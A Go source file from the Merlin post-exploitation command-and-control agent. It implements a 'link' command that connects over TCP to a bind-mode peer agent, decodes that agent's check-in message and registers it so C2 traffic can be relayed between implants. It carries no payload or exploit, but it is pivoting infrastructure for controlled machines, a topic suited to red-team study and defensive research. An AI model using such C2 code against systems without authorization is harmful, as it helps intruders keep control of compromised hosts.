// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"strings"
	"time"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
	"github.com/Ne0nd0g/merlin-agent/p2p"
)

// Link connects to the provided target over the provided protocol and establishes a peer-to-peer connection with the Agent
func Link(cmd jobs.Command) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.Link(): entering into function with %+v", cmd))

	if len(cmd.Args) < 2 {
		return jobs.Results{Stderr: fmt.Sprintf("expected 2 arguments with the link command, received %d: %+v", len(cmd.Args), cmd.Args)}
	}

	// switch on first argument
	switch strings.ToLower(cmd.Args[0]) {
	case "tcp":
		return TCPConnect(cmd.Args[1:])
	default:
		return jobs.Results{
			Stderr: fmt.Sprintf("Unhandled link type: %s", cmd.Args[0]),
		}
	}
}

// TCPConnect establishes a TCP connection to a tcp-bind peer-to-peer Agent
func TCPConnect(args []string) (results jobs.Results) {
	linkedAgent := p2p.Agent{
		In:   make(chan messages.Base, 100),
		Out:  make(chan messages.Base, 100),
		Type: p2p.TCPBIND,
	}

	// args[0] = target (e.g., 192.168.1.10:8080)
	if len(args) <= 0 {
		results.Stderr = fmt.Sprintf("Expected 1 argument, received %d", len(args))
		return
	}

	// Establish connection to downstream agent
	conn, err := net.Dial("tcp", args[0])
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error attempting to link the agent: %s", err.Error())
		return
	}

	linkedAgent.Conn = conn

	// Wait for linked agent first checking message
	data := make([]byte, 50000)
	n, err := bufio.NewReader(linkedAgent.Conn).Read(data)
	if err != nil {
		cli.Message(cli.WARN, fmt.Sprintf("there was an error reading datat from linked agent %s: %s", args[0], err))
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("Read %d bytes from linked %s agent %s at %s", n, &linkedAgent, args[0], time.Now().UTC()))

	// Decode GOB from server response into Base
	var msg messages.Delegate
	reader := bytes.NewReader(data)

	//fmt.Printf("DATA: %s\n", data)
	errD := gob.NewDecoder(reader).Decode(&msg)
	if errD != nil {
		err = fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
		return
	}

	// Store LinkedAgent
	p2p.LinkedAgents.Store(msg.Agent, linkedAgent)

	p2p.AddDelegateMessage(msg)

	results.Stdout = fmt.Sprintf("Successfully connected to %s at %s", msg.Agent, args[0])

	// The listen function is in commands/listen.go
	go listen(linkedAgent.Conn)
	return
}
